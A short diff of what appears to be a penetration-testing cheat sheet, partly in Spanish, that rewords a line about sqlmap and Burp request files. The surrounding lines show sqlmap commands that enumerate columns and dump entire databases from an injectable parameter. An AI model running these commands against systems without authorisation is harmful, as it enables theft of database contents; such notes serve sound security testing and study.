@@ -273,7 +273,7 @@ sqlmap -u http://[IP]/?id=1 -D database_name -T table_name --columns
 
 sqlmap -u http://[IP]/?id=1 -D database_name -T table_name --dump-all
 
-Mediante archivo de petición guardado de Burp --> sqlmap -r request.req -p <parametro inyectable> --batch --dbs
+sqlmap -r request.req -p <parametro inyectable> --batch --dbs --> mediante archivo de petición guardado de Burp
 
 More....https://hackersonlineclub.com/sql-injection-cheatsheet/
 
